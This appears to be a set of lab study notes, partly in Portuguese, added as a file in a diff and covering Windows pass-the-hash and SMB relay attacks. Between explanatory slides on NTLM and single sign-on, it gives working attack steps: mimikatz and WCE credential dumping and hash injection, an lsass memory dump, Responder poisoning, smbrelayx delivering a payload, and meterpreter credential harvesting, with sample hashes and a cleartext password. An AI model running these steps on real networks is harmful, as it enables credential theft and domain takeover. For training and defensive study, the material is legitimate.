@@ -1,0 +1,381 @@
+Pass the Hash
+=============
+
+C:\> whoami /all
+
+Vai abrir um prompt como system (seu prompt tem que abir como administrator)
+C:\> psexec.exe -s -i -d cmd.exe 
+
+C:\> CQHashDumpv2.exe /samdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+
+C:\> mimikatz.exe
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /user:Administrator /domain:localhost /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
+mimikatz # 
+
+Abre um prompt novo como system
+C:\> whoami
+well
+
+C:\> psexec.exe \\192.168.5.111 cmd.exe 
+
+C:\> whoami
+administrator
+
+C:\> 
+
+C:\> pd.exe -accepteula -ma lsass.exe
+C:\> rem lsass3owkdwpokdok.dump lsass.dmp
+C\:> mimikatz
+
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPassword
+
+TWC Pass-theHash
+================
+
+Mark Russonovich
+Tecnical Fellow Microsoft Azure
+
+Nathan Ide 
+Principal Dev Lead Microsoft Windows
+
+Pass-the-Hash: How Attackers Spread and How to Stop Them
+
+Pass-the-Hash == Single-Sign On
+
+- Pass-the-Hash is the use of a saved credential or authentication
+ - It exists solely to support single-sign on (SSO)
+ - If you want SSO, you are exposed to PHT
+- In other words:
+ - If you want SSO, pass-the-hash cannot be "fixed"
+ - This is not a "Windows probem"
+- There are two types of pass-the-hash
+ - Credential reuse: using the saved credential on the system on which  it was saved
+ - Credential theft: taking the saved credential to another system and using it from there
+
+Single-Sign On Explained
+------------------------
+ 
+1. Sue enter username and password
+[ User: Sue]
+[Password: a1b2c3]
+2. PC creates Sue's user session
+Sue's laptop
+`-> Sue's User Session
+    `->[ User: Sue]
+	|->[Password Hash: aee9284f...]
+3. PC proves knowledge of Sue's hash to Server
+[PC] ----- Send -----> [SMB]
+4. Server creates a session for Sue
+File Server
+`-> Sue's User Session
+
+In Pass-the-Hash Technique
+--------------------------
+1. PC Fred user session
+Fred's laptop
+`-> Fred's User Session
+    `->[ User: Fred]
+	|->[Password Hash: 567f3as...]
+2. Fred Runs malware
+Fred's laptop
+`-> Fred's User Session
+|    `->[ User: Fred]
+|	 |->[Password Hash: 567f3as...]
+`-> Malware User Session
+    `->[ User: Fred]
+	 |->[Password Hash: 567f3as...]
+3. PC proves knowledge of Fred's hash to Sue's Laptop
+[Fred's PC] ----- Send -----> [Sue's PC]
+4. Malware infects Sue's laptop as Fred
+Sue's laptop
+`-> Sue's User Session
+|    `->[ User: Sue]
+|	 |->[Password Hash: aee9284f...]]
+`-> Malware User Session
+    `->[ User: Fred]
+	|->[Password Hash: 567f3as...]
+    |->[ User: Sue]
+	|->[Password Hash: aee9284f...]]
+Malware now 1 session with 2 credential
+5. Malware proves knowledge of Sue's hash to Server
+   and Malware infects File Server as Sue
+[PC] ----- Send -----> [SMB]
+
+Pass-the-Hash on Windows Today
+------------------------------
+
+windows single-sign on architecture
+1. Sue enter username and password
+[ User: Sue]
+[Password: a1b2c3]
+2. PC creates Sue's user session
+Local ecurity Authority (LSASS)
+NTLM [NTOWF:aee9284f]
+Digest [Password: a1b2c3]
+Kerberos [Ticket-Granting Ticket][Service Ticket]
+3. Send to credential DC
+[PC] ----- Send Ticket -----> [DC]
+[PC] ----- 192.168.5.1 -----> [DC]
+     ----- User: Sue   -----> [DC] Share, Mail, Proxy
+	 ----- Hash: aee9284f --> [DC] Portal
+	 Credential Footprint
+	 NTLM + Digest + Kerberos
+
+Microsoft Windows Kerberos Pass-The-Ticket Replay Security Bypass Vulnerability
+
+Pass-the-Hash Tools on Windows
+------------------------------
+1. PC creates Sue's user session
+Local ecurity Authority (LSASS)
+NTLM [NTOWF:aee9284f]
+Digest [Password: a1b2c3]
+Kerberos [Ticket-Granting Ticket][Service Ticket]
+2. Amplia Security - Windows Credentials Editor
+WCE --> LSASS
+ `-> Credential Store
+
+Demo
+====
+
+1º Host win7x64
+Login Sue|P@ssw0rd
+\\pthdemo-dc\
+ddclick SueOnly directory Share
+cmd.exe with run administrator
+
+c:\> cd tools\wce
+c:\> wce -l
+hash sue 
+hash win7$
+
+c:\> wce -l -o hash.txt
+c:\> wce -K
+Kerberos tickets saved in files wce_ccache and wce_krbkts
+
+switch user
+
+Login Fred|12qw!@QW
+Login Sue|P@ssw0rd
+\\pthdemo-dc\
+ddclick SueOnly directory Share
+cmd.exe with run administrator
+ 
+c:\> cd tools\wce
+c:\> dir \\pthdemo-dc\sueonly
+access deny
+
+c:\> wce -k
+added tickets
+
+c:\> dir \\pthdemo-dc\sueonly
+list
+
+c:\> dir \\192.168.1.1\sueonly
+access deny
+
+c:\> hash.txt
+
+c:\> wce -s Sue:PTHDEMO:aee9284f
+
+c:\> dir \\192.168.1.1\sueonly
+list
+ 
+Problem: Domain Credential Harvesting
+-------------------------------------
+Mimikatz --> LSASS
+ `-> Credential Store
+
+C:\> cd \toos\mimikatz\x64
+
+C:\> type dump_password.bat
+mimikatz privilege::debug sekurlsa::logonPasswords exit
+
+C:\> dump_password.bat > pass.txt
+
+C:\> pass.txt
+
+Administrator:500:4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D:::
+ msv :
+  [00000002] Primary
+  * Username : welltom
+  * Domain   : HOW2SEC
+  * LM       : 921988ba001dc8e1c295285c92cd06b4
+  * NTLM     : 25accfc9cdecc45a3029075fc13afc36
+  * SHA1     : fe34fa0e846bf03de53bf7c21849d7fd92cbe103
+ wdigest :
+  * Username : welltom
+  * Domain   : HOW2SEC
+  * Password : P@ssw0rd01
+ kerberos :
+  * Username : welltom
+  * Domain   : HOW2SEC.LOCAL
+  * Password : (null)
+ ssp :
+ credman :
+
+
+cmd.exe --> Abre o prompt
+cmd.exe /k --> abre o prompt sem o cabe?alho
+cmd.exe -C tree --> abre o prompt e fecha assim que executar o comando
+c:\> start . <-- abre o windows explorer
+c:\> start /MIN <-- abre o windows explorer minimizado.
+cmd.exe /C "start /MIN explorer \\192.168.5.131"
+
+ 
+SMBRelay
+========
+
+What is SMB?
+------------
+The Server Message Block protocol, is a remote file access protocol originally specified
+by Microsoft, IBM, and Intel. It's one of the protocols most commonly used by DOS and 
+Windows machines to access files on a file server.
+
+
+SMB and NTLM
+------------
+SMB uses NTLM to perform authentication. NTLM over a Server Message Block (SMB)
+transport is one of the most common uses of NTLM authentication and encryption.
+
+NTLM uses an encrypted challenge/response protocol to authenticate a user without 
+sending the user's password over the wire. Instead, the system requesting authentication 
+must perfirm a calculation that proves it has access to the secured NTLM credentials.
+
+NTLM Challenge/Response
+-----------------------
+[Client] 1 -------------------> [Server] This is Well. Log me in.
+[Client] 2 <------------------- [Server] If this is really Well then encrypt this challenge with Well PW Hash.
+[Client] 3 -------------------> [Server] Here is the challenge.
+[Client] 4 <------------------- [Server] Access Granted.
+
+NTLM Challenge/Response Relayed
+-------------------------------
+
+This is Well. Log me in.
+[Client] 1 --------->[Attack]----------> [Server] 
+If this is really Well then encrypt this challenge with Well PW Hash.
+[Client] 2 <--------[Attack]<----------- [Server]
+Here is the challenge.
+[Client] 3 --------->[Attack]----------> [Server]
+Access Denied				Access Granted.
+[Client] 4 <--------[Attack]<----------- [Server] 
+
+How to MiTM?
+------------
+. Use a Hub or Flood a Switch
+. ARP Spoofing
+. DNS Spoofing
+. LLMNR/NBTNS Response Poising
+
+LLMNR/NBTNS
+-----------
+. NetBIOS Name Service
+. Link-Local Multicast Name Resolution
+. LLMNR/NBTNS allows workstations to communicate by hostname without the use of a DNS Server
+. LLMNR is just an updated NetBIOS. LLMNR performs the same functions NBTNS did on older Windows operationg
+systems, but it has been updated to include Internet Protocol Version 6 (IPv6)
+
+When a workstation needs to request a name lookup, it checks the following three (3) places in order:
+. Localhost file
+. Configured DNS Servers
+. LLMNR/NetBIOS Multicast/Broadcast.
+
+Since the final lookup is a broadcast/multicast request, any system on the local network can answer.
+
+NBTNS/LLMNR Response Poisoning
+------------------------------
+. Metasploit Framework
+. Responder
+
+Responder output:
+[SMB] NTLMv2-SSP Hash     	: maloy.03::HOW2SEC:1122334455667788:7785BF1C5B172B87E8A6D8AFEEFD5449:0101000
+0000000005A9C1ADD56DBD201BC8E0616918A6B920000000002000A0053004D0042003100320001000A0053004D00420031003200
+04000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D00420031003200080030003000000000000
+0000100000000200000FFD0A75CC591D195DD6A447F2871F6760FF4432CDB692BFA7B02E6AE8A75C9050A00100000000000000000
+0000000000000000000900160063006900660073002F00770069006E003100500053000000000000000000
+
+. what can I do with this?
+ - Can I Pass the Hash (PtH)? 	No.
+ - Can I crack the hash?		Yes.
+ - Can I relay the hash?		Absolutely!
+
+Demo
+----
+
+# Responder -i 192.168.5.131 
+
+
+# msfconsole
+use o handler                +----- IP do servidor de arquivos
+                             v
+# python smbrelayx.py -h 192.168.5.100 -e SMBRelayPayload.exe
+
+
+Entre no Respodner.conf 
+
+desabilite os:
+SMB = Off
+HTTP = Off
+
+# Responder -i 192.168.5.131 
+
+na est??o fa?a CTRL+R
+\\
+
+meterpreter> ps
+meterpreter> migrate 620 <- um processo que seja executado pelo System
+meterpreter>  getuid
+meterpreter> use kiwi
+meterpreter> creds_all
+meterpreter>  shell
+meterpreter> 
+c:\> net user superuser /domain
+
+
+
+
+
+Entre no Respodner.conf 
+
+volte as configura??e os:
+SMB = On
+HTTP = On
+
+
+# Responder -i 192.168.5.131 -bwF
+
+na esta??o:
+Abra o Browser se tiver habilitado pela busca automatica do proxy ser? apresentado o prompt
+como se tiverssimos um proxy autenticado.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
